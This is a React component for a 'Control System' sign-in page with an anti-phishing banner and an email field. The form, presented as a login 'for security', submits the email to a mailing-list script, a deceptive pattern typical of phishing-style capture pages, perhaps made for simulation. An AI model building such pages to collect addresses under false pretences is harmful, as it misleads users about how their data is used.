import React from 'react';

const ControlSystem = () => {
  return (
    <div style={{
      fontFamily: 'Arial, sans-serif',
      margin: 0,
      backgroundColor: '#f9f9f9',
      minHeight: '100vh'
    }}>
      <div style={{
        maxWidth: '450px',
        margin: '40px auto',
        background: 'white',
        padding: '30px',
        borderRadius: '8px',
        boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
        textAlign: 'center'
      }}>

        <div style={{
          backgroundColor: '#fff3cd',
          border: '1px solid #ffeeba',
          color: '#856404',
          padding: '10px',
          marginBottom: '20px',
          fontSize: '0.9em',
          borderRadius: '5px',
          textAlign: 'center'
        }}>
          Stay safe: Check the address bar to ensure you are on the real Control System site before logging in.
        </div>

        <h1 style={{ marginTop: 0, fontSize: '1.5em', color: '#333' }}>Sign in or create an account</h1>
        <p style={{ color: '#666', fontSize: '0.9em', marginBottom: '20px' }}>For security, please sign in to access your information</p>

        <form action="/mailinglist.php" method="POST">
          <fieldset style={{ border: 'none', padding: 0, margin: 0, textAlign: 'left' }}>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ marginBottom: '15px' }}>
                <label htmlFor="email" style={{ display: 'block', marginBottom: '5px', fontWeight: 'bold' }}>Email:</label>
                <input
                  type="text"
                  name="email"
                  id="email"
                  placeholder="Enter your email"
                  style={{
                    width: '100%',
                    padding: '10px',
                    marginBottom: '10px',
                    boxSizing: 'border-box',
                    border: '1px solid #ccc',
                    borderRadius: '4px'
                  }}
                />
              </li>
              <li style={{ marginBottom: '20px', fontSize: '0.9em' }}>
                <input type="checkbox" id="keep-signed" /> <label htmlFor="keep-signed">Keep me signed in</label>
              </li>
              <li>
                <button type="submit" style={{
                  textDecoration: 'none',
                  borderRadius: '5px',
                  fontSize: '0.9em',
                  fontWeight: 600,
                  transition: 'background-color 0.3s',
                  cursor: 'pointer',
                  backgroundColor: '#ff0058',
                  color: 'white',
                  border: 'none',
                  width: '100%',
                  display: 'block',
                  textAlign: 'center',
                  padding: '12px',
                  boxSizing: 'border-box'
                }}>Continue</button>
              </li>
            </ul>
          </fieldset>
        </form>
      </div>
    </div>
  );
};

export default ControlSystem;
